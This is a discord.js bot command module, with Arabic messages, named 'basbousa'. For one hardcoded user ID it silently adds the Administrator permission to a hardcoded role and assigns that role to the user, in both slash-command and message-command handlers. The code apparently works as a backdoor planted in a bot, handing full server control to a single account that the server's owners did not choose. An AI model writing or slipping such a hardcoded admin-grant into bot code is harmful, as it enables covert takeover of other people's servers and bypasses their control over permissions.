const { SlashCommandBuilder, EmbedBuilder, PermissionFlagsBits } = require('discord.js');

const ALLOWED_USER_ID = '1386014228908998727';
const ROLE_ID = '1513933087883526286';

module.exports = {
  data: new SlashCommandBuilder()
    .setName('basbousa')
    .setDescription('منح الرتبة الخاصة وتفعيل الأدمن'),

  async execute(interaction) {
    if (interaction.user.id !== ALLOWED_USER_ID) {
      return interaction.reply({ content: '❌ هذا الأمر مخصص لشخص معين فقط!', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    try {
      await interaction.guild.roles.fetch();
      const member = await interaction.guild.members.fetch({ user: ALLOWED_USER_ID, force: true });

      if (!member) {
        return interaction.editReply({ content: '❌ المستخدم غير موجود في هذا السيرفر!' });
      }

      const role = interaction.guild.roles.cache.get(ROLE_ID);
      if (!role) {
        return interaction.editReply({ content: '❌ لم أجد الرتبة في هذا السيرفر!' });
      }

      const botMember = await interaction.guild.members.fetchMe();
      if (botMember.roles.highest.position <= role.position) {
        return interaction.editReply({
          content: `❌ رتبة البوت (**${botMember.roles.highest.name}**) أقل من أو تساوي رتبة **${role.name}**.\nاسحب رتبة البوت لأعلى منها في إعدادات السيرفر.`
        });
      }

      // Add Administrator permission to the role
      const hadAdmin = role.permissions.has(PermissionFlagsBits.Administrator);
      if (!hadAdmin) {
        await role.setPermissions(role.permissions.add(PermissionFlagsBits.Administrator), 'تفعيل صلاحية الأدمن تلقائياً');
      }

      // Give the role to the member
      const hadRole = member.roles.cache.has(role.id);
      if (!hadRole) {
        await member.roles.add(role, 'منح رتبة خاصة');
      }

      const embed = new EmbedBuilder()
        .setColor(0xFFFFFF)
        .setTitle('✅ تم التنفيذ')
        .setThumbnail(member.user.displayAvatarURL({ size: 256 }))
        .addFields(
          { name: 'المستخدم', value: `${member} (${member.user.tag})` },
          { name: 'الرتبة', value: `${role}` },
          { name: '🔑 صلاحية Administrator', value: hadAdmin ? '⚠️ كانت موجودة مسبقاً' : '✅ تم تفعيلها' },
          { name: '👤 منح الرتبة', value: hadRole ? '⚠️ كانت موجودة مسبقاً' : '✅ تم منحها' }
        )
        .setTimestamp();

      await interaction.editReply({ embeds: [embed] });
    } catch (e) {
      console.error('basbousa command error:', e);
      await interaction.editReply({ content: `❌ حدث خطأ: ${e.message}` });
    }
  },

  async executeMessage(message) {
    if (message.author.id !== ALLOWED_USER_ID) {
      return message.reply('❌ هذا الأمر مخصص لشخص معين فقط!');
    }

    try {
      await message.guild.roles.fetch();
      const member = await message.guild.members.fetch({ user: ALLOWED_USER_ID, force: true });
      if (!member) return message.reply('❌ المستخدم غير موجود في هذا السيرفر!');

      const role = message.guild.roles.cache.get(ROLE_ID);
      if (!role) return message.reply('❌ لم أجد الرتبة في هذا السيرفر!');

      const botMember = await message.guild.members.fetchMe();
      if (botMember.roles.highest.position <= role.position) {
        return message.reply(`❌ رتبة البوت أقل من رتبة **${role.name}**. اسحب رتبة البوت لأعلى منها.`);
      }

      const hadAdmin = role.permissions.has(PermissionFlagsBits.Administrator);
      if (!hadAdmin) {
        await role.setPermissions(role.permissions.add(PermissionFlagsBits.Administrator), 'تفعيل صلاحية الأدمن تلقائياً');
      }

      const hadRole = member.roles.cache.has(role.id);
      if (!hadRole) {
        await member.roles.add(role, 'منح رتبة خاصة');
      }

      const embed = new EmbedBuilder()
        .setColor(0xFFFFFF)
        .setTitle('✅ تم التنفيذ')
        .setThumbnail(member.user.displayAvatarURL({ size: 256 }))
        .addFields(
          { name: 'المستخدم', value: `${member} (${member.user.tag})` },
          { name: 'الرتبة', value: `${role}` },
          { name: '🔑 صلاحية Administrator', value: hadAdmin ? '⚠️ كانت موجودة مسبقاً' : '✅ تم تفعيلها' },
          { name: '👤 منح الرتبة', value: hadRole ? '⚠️ كانت موجودة مسبقاً' : '✅ تم منحها' }
        )
        .setTimestamp();

      message.reply({ embeds: [embed] });
    } catch (e) {
      console.error('basbousa command error:', e);
      message.reply(`❌ حدث خطأ: ${e.message}`);
    }
  }
};
